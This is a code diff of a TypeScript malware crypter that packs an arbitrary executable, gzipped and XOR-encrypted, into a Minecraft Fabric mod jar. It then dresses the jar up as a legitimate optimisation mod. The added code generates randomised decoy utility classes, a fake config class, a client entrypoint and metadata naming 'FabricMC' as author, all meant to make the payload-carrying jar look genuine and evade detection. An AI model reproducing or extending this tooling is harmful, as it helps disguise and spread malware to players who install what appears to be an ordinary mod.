@@ -45,15 +45,177 @@ function randModId(): string {
   return MOD_IDS[Math.floor(Math.random() * MOD_IDS.length)];
 }
 
+// ── fake utility class generators ────────────────────────────────────────────
+
+type FakeGen = (pkg: string, name: string) => string;
+
+function fakeChunkCache(pkg: string, name: string): string {
+  return [
+    `package ${pkg};`,
+    `import java.util.concurrent.ConcurrentHashMap;`,
+    `public class ${name}{`,
+    `  private static final int CAP=512;`,
+    `  private static final ConcurrentHashMap<Long,int[]> C=new ConcurrentHashMap<>(CAP);`,
+    `  public static int[] get(long k){return C.get(k);}`,
+    `  public static void put(long k,int[] v){if(C.size()>=CAP)C.clear();C.put(k,v);}`,
+    `  public static void evict(long k){C.remove(k);}`,
+    `  public static void flush(){C.clear();}`,
+    `}`,
+  ].join("\n");
+}
+
+function fakeRenderBatcher(pkg: string, name: string): string {
+  return [
+    `package ${pkg};`,
+    `public class ${name}{`,
+    `  private final float[] buf;`,
+    `  private int pos;`,
+    `  public ${name}(int cap){buf=new float[cap*7];pos=0;}`,
+    `  public boolean add(float x,float y,float z,float r,float g,float b,float a){`,
+    `    if(pos+7>buf.length)return false;`,
+    `    buf[pos++]=x;buf[pos++]=y;buf[pos++]=z;`,
+    `    buf[pos++]=r;buf[pos++]=g;buf[pos++]=b;buf[pos++]=a;`,
+    `    return true;`,
+    `  }`,
+    `  public void reset(){pos=0;}`,
+    `  public int size(){return pos/7;}`,
+    `  public float[] data(){return buf;}`,
+    `}`,
+  ].join("\n");
+}
+
+function fakeEntityTracker(pkg: string, name: string): string {
+  return [
+    `package ${pkg};`,
+    `public class ${name}{`,
+    `  private static final int SZ=256;`,
+    `  private static final int[] ids=new int[SZ];`,
+    `  private static final double[] xs=new double[SZ],ys=new double[SZ],zs=new double[SZ];`,
+    `  private static int head=0,count=0;`,
+    `  public static synchronized void store(int id,double x,double y,double z){`,
+    `    int i=head%SZ;ids[i]=id;xs[i]=x;ys[i]=y;zs[i]=z;head++;if(count<SZ)count++;`,
+    `  }`,
+    `  public static synchronized double[] fetch(int id){`,
+    `    for(int i=0;i<count;i++){if(ids[i]==id)return new double[]{xs[i],ys[i],zs[i]};}`,
+    `    return null;`,
+    `  }`,
+    `  public static synchronized void remove(int id){`,
+    `    for(int i=0;i<count;i++){if(ids[i]==id)ids[i]=-1;}`,
+    `  }`,
+    `}`,
+  ].join("\n");
+}
+
+function fakeBiomeCache(pkg: string, name: string): string {
+  return [
+    `package ${pkg};`,
+    `import java.util.Arrays;`,
+    `public class ${name}{`,
+    `  private static final int SZ=1024;`,
+    `  private static final int[] K=new int[SZ],V=new int[SZ];`,
+    `  static{Arrays.fill(K,-1);}`,
+    `  public static int get(int k){int h=Math.abs(k%SZ);return K[h]==k?V[h]:-1;}`,
+    `  public static void set(int k,int v){int h=Math.abs(k%SZ);K[h]=k;V[h]=v;}`,
+    `  public static void invalidate(){Arrays.fill(K,-1);}`,
+    `}`,
+  ].join("\n");
+}
+
+function fakeLightHelper(pkg: string, name: string): string {
+  return [
+    `package ${pkg};`,
+    `public class ${name}{`,
+    `  public static int attenuate(int level,int steps){return Math.max(0,level-steps);}`,
+    `  public static int mix(int a,int b){return Math.max(a,b);}`,
+    `  public static boolean needsUpdate(int prev,int next){return prev!=next;}`,
+    `  public static int pack(int block,int sky){return(sky&0xF)<<4|(block&0xF);}`,
+    `  public static int blockLight(int packed){return packed&0xF;}`,
+    `  public static int skyLight(int packed){return(packed>>4)&0xF;}`,
+    `  private ${name}(){}`,
+    `}`,
+  ].join("\n");
+}
+
+function fakeTickQueue(pkg: string, name: string): string {
+  return [
+    `package ${pkg};`,
+    `import java.util.ArrayDeque;`,
+    `public class ${name}{`,
+    `  private static final ArrayDeque<Runnable> Q=new ArrayDeque<>();`,
+    `  private static final int MAX=32;`,
+    `  public static synchronized void schedule(Runnable r){Q.offer(r);}`,
+    `  public static synchronized int flush(){`,
+    `    int n=0;`,
+    `    while(!Q.isEmpty()&&n<MAX){try{Q.poll().run();}catch(Exception ignored){}n++;}`,
+    `    return n;`,
+    `  }`,
+    `  public static synchronized int pending(){return Q.size();}`,
+    `  public static synchronized void clear(){Q.clear();}`,
+    `}`,
+  ].join("\n");
+}
+
+function fakeStateCache(pkg: string, name: string): string {
+  return [
+    `package ${pkg};`,
+    `import java.util.Arrays;`,
+    `public class ${name}{`,
+    `  private static final int MASK=0x3FFF;`,
+    `  private static final short[] D=new short[MASK+1];`,
+    `  private static final boolean[] VALID=new boolean[MASK+1];`,
+    `  public static short get(int id){int i=id&MASK;return VALID[i]?D[i]:0;}`,
+    `  public static void put(int id,short v){int i=id&MASK;D[i]=v;VALID[i]=true;}`,
+    `  public static void invalidate(int id){VALID[id&MASK]=false;}`,
+    `  public static void clear(){Arrays.fill(VALID,false);}`,
+    `}`,
+  ].join("\n");
+}
+
+function fakeBytePool(pkg: string, name: string): string {
+  return [
+    `package ${pkg};`,
+    `import java.util.concurrent.ConcurrentLinkedQueue;`,
+    `import java.util.Arrays;`,
+    `public class ${name}{`,
+    `  private static final int BUF=8192,MAX=32;`,
+    `  private static final ConcurrentLinkedQueue<byte[]> POOL=new ConcurrentLinkedQueue<>();`,
+    `  public static byte[] acquire(){byte[] b=POOL.poll();return b!=null?b:new byte[BUF];}`,
+    `  public static void release(byte[] b){`,
+    `    if(b!=null&&b.length==BUF&&POOL.size()<MAX){Arrays.fill(b,(byte)0);POOL.offer(b);}`,
+    `  }`,
+    `}`,
+  ].join("\n");
+}
+
+const FAKE_CLASS_POOL: FakeGen[] = [
+  fakeChunkCache, fakeRenderBatcher, fakeEntityTracker, fakeBiomeCache,
+  fakeLightHelper, fakeTickQueue, fakeStateCache, fakeBytePool,
+];
+
+function pickFakeClasses(pkg: string, count: number): { name: string; src: string }[] {
+  const shuffled = [...FAKE_CLASS_POOL].sort(() => Math.random() - 0.5);
+  return shuffled.slice(0, count).map(gen => {
+    const name = randName();
+    return { name, src: gen(pkg, name) };
+  });
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+
 export async function cryptToJar(exe: Buffer, out: string, mcVersion = "26.1.2"): Promise<void> {
   const gz = zlib.gzipSync(exe, { level: 9 });
   const key = randKey();
   const pak = Buffer.concat([Buffer.from([key]), xorBuf(gz, key)]);
 
-  const modId    = randModId();
-  const className = randName();
-  const pkg      = `net.fabricmc.${modId}`;
-  const pkgPath  = pkg.replace(/\./g, "/");
+  const modId      = randModId();
+  const mainName   = randName();
+  const clientName = randName();
+  const configName = randName();
+  const pkg        = `net.fabricmc.${modId}`;
+  const pkgPath    = pkg.replace(/\./g, "/");
+
+  const fakeCount   = 3 + Math.floor(Math.random() * 3); // 3–5 extra classes
+  const fakeClasses = pickFakeClasses(pkg, fakeCount);
 
   const tmp = fs.mkdtempSync("/tmp/cjar-");
   try {
@@ -73,29 +235,43 @@ export async function cryptToJar(exe: Buffer, out: string, mcVersion = "26.1.2")
     fs.mkdirSync(srcPkgDir, { recursive: true });
     fs.mkdirSync(srcApiDir, { recursive: true });
 
-    const stubFile = path.join(srcApiDir, "ModInitializer.java");
-    const mainFile = path.join(srcPkgDir, `${className}.java`);
-    fs.writeFileSync(stubFile, buildModInitializerStub());
-    fs.writeFileSync(mainFile, buildJarSource(pkg, className));
+    // API stubs
+    const stubFile       = path.join(srcApiDir, "ModInitializer.java");
+    const clientStubFile = path.join(srcApiDir, "ClientModInitializer.java");
+    fs.writeFileSync(stubFile,       buildModInitializerStub());
+    fs.writeFileSync(clientStubFile, buildClientModInitializerStub());
 
-    const javac = await $`javac -source 17 -target 17 -d ${classDir} ${stubFile} ${mainFile}`
-      .nothrow()
-      .quiet();
+    // Mod classes
+    const mainFile   = path.join(srcPkgDir, `${mainName}.java`);
+    const clientFile = path.join(srcPkgDir, `${clientName}.java`);
+    const configFile = path.join(srcPkgDir, `${configName}.java`);
+    fs.writeFileSync(mainFile,   buildJarSource(pkg, mainName));
+    fs.writeFileSync(clientFile, buildClientModClass(pkg, clientName));
+    fs.writeFileSync(configFile, buildConfigClass(pkg, configName));
+
+    // Fake utility classes
+    const fakeFiles: string[] = [];
+    for (const fc of fakeClasses) {
+      const f = path.join(srcPkgDir, `${fc.name}.java`);
+      fs.writeFileSync(f, fc.src);
+      fakeFiles.push(f);
+    }
+
+    const allSrc = [stubFile, clientStubFile, mainFile, clientFile, configFile, ...fakeFiles];
+    const javac  = await $`javac -source 17 -target 17 -d ${classDir} ${allSrc}`.nothrow().quiet();
     if (javac.exitCode !== 0)
       throw new Error(`javac: ${javac.stderr.toString().trim()}`);
 
     fs.writeFileSync(path.join(assetDir, "data.pak"), pak);
     fs.writeFileSync(
       path.join(classDir, "fabric.mod.json"),
-      buildFabricModJson(modId, pkg, className, mcVersion),
+      buildFabricModJson(modId, pkg, mainName, clientName, mcVersion),
     );
 
     const mfPath = path.join(metaDir, "MANIFEST.MF");
     fs.writeFileSync(mfPath, "Manifest-Version: 1.0\n\n");
 
-    const jar = await $`jar cfm ${out} ${mfPath} -C ${classDir} .`
-      .nothrow()
-      .quiet();
+    const jar = await $`jar cfm ${out} ${mfPath} -C ${classDir} .`.nothrow().quiet();
     if (jar.exitCode !== 0)
       throw new Error(`jar: ${jar.stderr.toString().trim()}`);
   } finally {
@@ -107,6 +283,38 @@ function buildModInitializerStub(): string {
   return [
     "package net.fabricmc.api;",
     "public interface ModInitializer { void onInitialize(); }",
+  ].join("\n");
+}
+
+function buildClientModInitializerStub(): string {
+  return [
+    "package net.fabricmc.api;",
+    "public interface ClientModInitializer { void onInitializeClient(); }",
+  ].join("\n");
+}
+
+function buildClientModClass(pkg: string, name: string): string {
+  return [
+    `package ${pkg};`,
+    `public class ${name} implements net.fabricmc.api.ClientModInitializer{`,
+    `  public void onInitializeClient(){}`,
+    `}`,
+  ].join("\n");
+}
+
+function buildConfigClass(pkg: string, name: string): string {
+  return [
+    `package ${pkg};`,
+    `public class ${name}{`,
+    `  public static boolean enableChunkOpt=true;`,
+    `  public static boolean enableEntityOpt=true;`,
+    `  public static boolean enableRenderOpt=true;`,
+    `  public static int chunkCacheSize=512;`,
+    `  public static int entityCacheSize=256;`,
+    `  public static float renderQuality=1.0f;`,
+    `  public static boolean verboseLogging=false;`,
+    `  private ${name}(){}`,
+    `}`,
   ].join("\n");
 }
 
@@ -148,7 +356,9 @@ function buildJarSource(pkg: string, className: string): string {
   return lines.join("\n");
 }
 
-function buildFabricModJson(modId: string, pkg: string, className: string, mcVersion: string): string {
+function buildFabricModJson(
+  modId: string, pkg: string, mainName: string, clientName: string, mcVersion: string,
+): string {
   return JSON.stringify({
     schemaVersion: 1,
     id: modId,
@@ -158,7 +368,10 @@ function buildFabricModJson(modId: string, pkg: string, className: string, mcVer
     authors: ["FabricMC"],
     license: "MIT",
     environment: "*",
-    entrypoints: { main: [`${pkg}.${className}`] },
+    entrypoints: {
+      main:   [`${pkg}.${mainName}`],
+      client: [`${pkg}.${clientName}`],
+    },
     depends: {
       fabricloader: ">=0.15.0",
       minecraft: mcVersion,
